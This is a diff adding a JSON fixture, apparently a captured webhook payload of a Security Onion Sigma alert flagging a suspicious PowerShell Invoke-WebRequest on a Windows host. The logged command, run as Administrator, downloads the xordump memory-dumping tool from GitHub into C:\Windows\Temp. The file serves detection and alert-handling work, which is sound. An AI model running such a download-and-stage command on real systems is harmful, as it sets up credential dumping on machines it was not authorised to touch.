@@ -1,0 +1,230 @@
+[
+  {
+    "headers": {
+      "host": "172.20.24.220:5679",
+      "user-agent": "python-requests/2.32.5",
+      "accept-encoding": "gzip, deflate",
+      "accept": "application/json;charset=utf-8",
+      "connection": "keep-alive",
+      "content-type": "application/json",
+      "content-length": "4561"
+    },
+    "params": {},
+    "query": {},
+    "body": {
+      "@timestamp": "2026-07-22T08:55:59Z",
+      "sigma_level": "high",
+      "rule": {
+        "product": "windows",
+        "name": "Suspicious Invoke-WebRequest Execution",
+        "category": "process_creation",
+        "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
+      },
+      "event_data": {
+        "agent": {
+          "id": "1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+          "type": "endpoint",
+          "version": "9.0.8"
+        },
+        "process": {
+          "Ext": {
+            "mitigation_policies": [
+              "CET dynamic APIs can only be called out of proc",
+              "CF Guard"
+            ],
+            "ancestry": [
+              "OE9m/Yj5spu59rcd4uZU3w"
+            ],
+            "session_info": {
+              "authentication_package": "NTLM",
+              "relative_password_age": 480646.2434793,
+              "user_flags": [
+                "LOGON_EXTRA_SIDS",
+                "LOGON_NTLMV2_ENABLED",
+                "LOGON_WINLOGON"
+              ],
+              "relative_logon_time": 392221.19608,
+              "id": 1,
+              "logon_type": "Interactive"
+            },
+            "code_signature": [
+              {
+                "trusted": true,
+                "subject_name": "Microsoft Windows",
+                "exists": true,
+                "status": "trusted"
+              }
+            ],
+            "relative_file_creation_time": 164075784.0791541,
+            "authentication_id": "0x58038",
+            "relative_file_name_modify_time": 477466.9785601,
+            "token": {
+              "integrity_level_name": "high",
+              "security_attributes": [
+                "TSA://ProcUnique"
+              ],
+              "elevation_level": "default"
+            }
+          },
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            ],
+            "Ext": {
+              "code_signature": [
+                {
+                  "trusted": true,
+                  "subject_name": "Microsoft Windows",
+                  "exists": true,
+                  "status": "trusted"
+                }
+              ]
+            },
+            "code_signature": {
+              "trusted": true,
+              "subject_name": "Microsoft Windows",
+              "exists": true,
+              "status": "trusted"
+            },
+            "name": "powershell.exe",
+            "pid": 7796,
+            "args_count": 1,
+            "thread": {
+              "Ext": {
+                "call_stack_contains_unbacked": true
+              }
+            },
+            "entity_id": "OE9m/Yj5spu59rcd4uZU3w",
+            "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "working_directory": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\",
+          "pid": 8524,
+          "entity_id": "L3ZrVQcxRfv3RsiWyLpX9A",
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "args": [
+            "powershell.exe",
+            "&",
+            "{[Net.ServicePointManager]::SecurityProtocol",
+            "=",
+            "[Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest",
+            "\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\"",
+            "-OutFile",
+            "C:\\Windows\\Temp\\xordump.exe}"
+          ],
+          "code_signature": {
+            "trusted": true,
+            "subject_name": "Microsoft Windows",
+            "exists": true,
+            "status": "trusted"
+          },
+          "pe": {
+            "imphash": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
+            "original_file_name": "PowerShell.EXE"
+          },
+          "exit_code": 0,
+          "name": "powershell.exe",
+          "args_count": 8,
+          "hash": {
+            "sha256": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94"
+          },
+          "command_line": "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}"
+        },
+        "metadata": {
+          "input": {
+            "beats": {
+              "host": {
+                "ip": "172.20.24.99"
+              }
+            }
+          },
+          "index": "logs-endpoint.events.process-default"
+        },
+        "_index": ".ds-logs-endpoint.events.process-default-2026.07.05-000004",
+        "message": "Endpoint process event",
+        "tags": [
+          "elastic-agent",
+          "input-nodemanager",
+          "beats_input_codec_plain_applied",
+          "events.process"
+        ],
+        "@timestamp": "2026-07-20T08:52:32.848612Z",
+        "ecs": {
+          "version": "8.10.0"
+        },
+        "data_stream": {
+          "namespace": "default",
+          "type": "logs",
+          "dataset": "endpoint.events.process"
+        },
+        "elastic": {
+          "agent": {
+            "id": "1a52ee32-ef93-4f5a-b876-65bd1b7c795a"
+          }
+        },
+        "host": {
+          "os": {
+            "type": "windows"
+          },
+          "name": "win-kvkmd51ggkq",
+          "id": "c8fc26bf-dc76-4dba-adbb-bf31640d9c9f"
+        },
+        "@version": "1",
+        "_id": "v0W6fp8BstL_s-ZW6fW1",
+        "event": {
+          "sequence": 188322,
+          "ingested": "2026-07-20T08:53:26Z",
+          "kind": "event",
+          "created": "2026-07-20T08:52:37.8708497Z",
+          "module": "endpoint",
+          "action": [
+            "start",
+            "end"
+          ],
+          "id": "OZWc9AbxXaKhFKi++++4QrxB",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start",
+            "end"
+          ],
+          "dataset": "endpoint.events.process",
+          "outcome": "unknown"
+        },
+        "num_matches": 2,
+        "user": {
+          "domain": "WIN-KVKMD51GGKQ",
+          "name": "Administrator",
+          "id": "S-1-5-21-2509633083-2976797254-1976158143-500"
+        },
+        "num_hits": 2
+      },
+      "event": {
+        "severity": 4,
+        "module": "sigma",
+        "dataset": "sigma.alert",
+        "severity_label": "high"
+      },
+      "ioc": {
+        "schema_version": "1.0",
+        "source_engine": "sigma",
+        "rule": {
+          "severity": "high",
+          "name": "Suspicious Invoke-WebRequest Execution",
+          "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
+        },
+        "dataset": "sigma.alert"
+      },
+      "tags": "alert",
+      "_id": "6qS9fp8BiUkBvoTNPeON",
+      "_index": ".ds-logs-detections.alerts-so-2026.07.19-000119",
+      "num_hits": 16,
+      "num_matches": 16,
+      "source_system": "security-onion",
+      "severity_filter": "medium_and_above"
+    },
+    "webhookUrl": "http://localhost:5678/webhook/so-alerts",
+    "executionMode": "production"
+  }
+]
